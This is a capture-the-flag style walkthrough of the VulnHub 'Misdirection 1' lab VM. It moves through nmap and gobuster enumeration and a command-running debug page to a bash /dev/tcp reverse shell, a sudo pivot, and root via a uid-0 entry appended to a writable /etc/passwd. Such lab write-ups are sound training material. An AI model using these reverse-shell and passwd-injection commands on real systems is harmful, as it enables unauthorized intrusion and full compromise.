---
title: VulnHub - Misdirection 1
author: ret2x
date: 2021-07-13 20:23:15 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, command injection]
image:
    path: /assets/images/misdirection/front.png
---

**Description:** A linux machine hosting a web backdoor which allows the execution of system commands. Inappropriate permissions granted on sensitive files allowed to gain root privileges.

**Author:** FalconSpy

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/misdirection-1,371/](https://www.vulnhub.com/entry/misdirection-1,371/)

## Information Gathering
### Host Discovery

We enumerate the local network to find the target machine.

```console
root@kali:~$ nmap -sn -n 192.168.179.1/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 19:32 -05
Nmap scan report for 192.168.179.141
Host is up (0.00078s latency).
MAC Address: 00:0C:29:10:9B:9B (VMware)
Nmap scan report for 192.168.179.254
Host is up (0.00017s latency).
MAC Address: 00:50:56:E9:4A:73 (VMware)
Nmap scan report for 192.168.179.1
Host is up.
```

### Port Scanning

Located the target, I proceed to perform a TCP port scan for all ports with nmap.

```console
root@kali:~$ nmap -T4 -p1-65535 -vv -n 192.168.179.141 -oG tcp-all-ports.txt
...
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
3306/tcp open  mysql      syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 00:0C:29:10:9B:9B (VMware)
...
```

### Service Enumeration

Then I do the service enumeration to the open TCP ports.

```console
root@kali:~$ nmap -sV -sC -p22,80,3306,8080 -vv -n 192.168.179.141 -oN service-enum.txt
...
PORT     STATE SERVICE REASON         VERSION                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                 
| ssh-hostkey:                                                                                                                                                     
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)                                                                                                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkS5yl+Dpb7vsMGbzAHXBYrVSUNTh4kYGh8zajM3ZujG0XHLvgkW7xJ6F/meai9IrCB5gTq7+tTsn+fqNk0cAZugz4h+vwm5ekXe5szPPHNxNUlKuNAQ0Rch9k7
jT/2pWjtsE5iF6yFlh1UA2vBKqrTWVU5vrGWswdFRMWICKWiFXwl1Tv93STPsKHYoVbq74v2y1mVOLn+3JNMmRNCBFqh8Z2x+1DTep0YY8vIV325iRK5ROKCJAPeyX33uoxQ/cYrdPIS+Whs9QX0C+W343Hf2Ypq93h
3/g3NNm54LvZdE6X2vTUcUHGdvK2gU+dWQOiDhCpMDv3wiEAwGlf87P5                                                                                                           
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)                                                                                                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM+YEivOAqHPDlFWduSuOjAjuJtfC9v/KW2uYB85gxQuibGJQZhFPcxwPEUf7UvQ/a5fr/keKYF2Kdld6gO44jY= 
|   256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFHxbfiqinvu3cV7JoKrOF3w64zk+0N0h+/2nu+Z20Mk
80/tcp   open  http    syn-ack ttl 64 Rocket httpd 1.2.6 (Python 2.7.15rc1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: 502 Proxy Error
3306/tcp open  mysql   syn-ack ttl 64 MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
8080/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:10:9B:9B (VMware)
...
```

### Web Enumeration

Poked around the web page on port 80 I didn't found nothing interesting.

![](/assets/images/misdirection/screenshot-1.png)

So I'm heading to enumerate the web page on port 8080, but at a  glance I can't find anything, so I run gobuster to find hidden web directories and files.

![](/assets/images/misdirection/screenshot-2.png)

```console
root@kali:~$ gobuster dir -u http://192.168.179.141:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt,sql -e
...
http://192.168.179.141:8080/index.html           (Status: 200) [Size: 10918]
http://192.168.179.141:8080/images               (Status: 301) [Size: 326] [--> http://192.168.179.141:8080/images/]
http://192.168.179.141:8080/help                 (Status: 301) [Size: 324] [--> http://192.168.179.141:8080/help/]  
http://192.168.179.141:8080/scripts              (Status: 301) [Size: 327] [--> http://192.168.179.141:8080/scripts/]
http://192.168.179.141:8080/css                  (Status: 301) [Size: 323] [--> http://192.168.179.141:8080/css/]    
http://192.168.179.141:8080/wordpress            (Status: 301) [Size: 329] [--> http://192.168.179.141:8080/wordpress/]
http://192.168.179.141:8080/development          (Status: 301) [Size: 331] [--> http://192.168.179.141:8080/development/]
http://192.168.179.141:8080/manual               (Status: 301) [Size: 326] [--> http://192.168.179.141:8080/manual/]     
http://192.168.179.141:8080/js                   (Status: 301) [Size: 322] [--> http://192.168.179.141:8080/js/]         
http://192.168.179.141:8080/shell                (Status: 301) [Size: 325] [--> http://192.168.179.141:8080/shell/]      
http://192.168.179.141:8080/debug                (Status: 301) [Size: 325] [--> http://192.168.179.141:8080/debug/]
...
```

Checking the **debug** directorie I find a script that allows run system commands.

![](/assets/images/misdirection/screenshot-3.png)

## Exploitation
### Command Injection
**Getting a reverse shell**

Then we first set up a netcat listener and execute the the following instruction:

```console
bash -c "/bin/bash -i >& /dev/tcp/192.168.179.1/443 0>&1"
```

![](/assets/images/misdirection/screenshot-4.png)

And we get a reverse shell, after enumerating the sudo permissions I see that the bash command is possible execute it without password as the brexit user.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.141] 34318
bash: cannot set terminal process group (1047): Inappropriate ioctl for device
bash: no job control in this shell
www-data@misdirection:/var/www/html/debug$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@misdirection:/var/www/html/debug$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

After to execute the bash command as the brexit user, we get a bash session and spawn a TTY shell. 

```console
www-data@misdirection:/var/www/html/debug$ sudo -u brexit /bin/bash
python -c 'import pty;pty.spawn("/bin/bash")'
brexit@misdirection:~$ uname -a
Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege Escalation
### Insecure file permissions

Enumerating the system I managed to identify that the **passwd** file has write permissions for the brexit user.

```console
brexit@misdirection:/tmp$ ls -la /etc/passwd
-rwxrwxr-- 1 root brexit 1617 Jun  1  2019 /etc/passwd
```

In our attacking machine we generate a password hash with openssl.

```console
root@kali:~$ openssl passwd -1 get.r00t
$1$7Stc2cvP$1EtnNyONHtdDuHw2C9rNb1
```

Then we redirect our s4rgas user with the uid and gid set to 0 to the **passwd** file, and we switch to the new user with root privileges.

```console
brexit@misdirection:/tmp$ echo 's4rgaz:$1$7Stc2cvP$1EtnNyONHtdDuHw2C9rNb1:0:0:root:/root:/bin/bash' >> /etc/passwd
brexit@misdirection:/tmp$ su s4rgaz
Password: 
root@misdirection:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
